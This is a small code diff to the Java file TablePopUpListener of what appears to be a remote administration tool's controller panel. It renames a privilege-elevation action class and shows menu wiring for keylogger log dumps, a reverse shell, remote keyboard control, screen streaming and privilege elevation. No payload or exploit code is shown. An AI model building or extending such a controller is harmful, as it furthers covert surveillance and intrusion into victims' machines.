@@ -14,7 +14,7 @@ import GUI.TableUtils.KeyLogger.Actions.KeyLoggerAction;
 import GUI.TableUtils.KeyLogger.Constants.KeyLog;
 import GUI.TableUtils.KeyboardController.Listeners.KeyboardControllerMenuListener;
 import GUI.TableUtils.MessageBox.Listeners.MessageBoxMenuListener;
-import GUI.TableUtils.Permissions.Actions.ElevatePermissionAction;
+import GUI.TableUtils.Permissions.Events.PermissionsAction;
 import GUI.TableUtils.ReverseShell.Listeners.ReverseShellMenuListener;
 import GUI.TableUtils.ScreenStreaming.Listeners.ScreenMenuListener;
 import GUI.TableUtils.SystemState.Constants.SystemStatus;
@@ -138,7 +138,7 @@ public class TablePopUpListener extends MouseAdapter {
         dumpLogsMenu.addActionListener(new KeyLoggerAction(KeyLog.DUMP_LAST));
         dumpAllLogsMenu.addActionListener(new KeyLoggerAction(KeyLog.DUMP_ALL));
         keyboardController.addActionListener(new KeyboardControllerMenuListener(mainGUI));
-        elevatePrivilegesMenu.addActionListener(new ElevatePermissionAction());
+        elevatePrivilegesMenu.addActionListener(new PermissionsAction());
         messageBoxMenu.addActionListener(new MessageBoxMenuListener());
         streamScreenMenu.addActionListener(new ScreenMenuListener());
         restartMenu.addActionListener(new ConnectionAction(ConnStatus.RESTART));
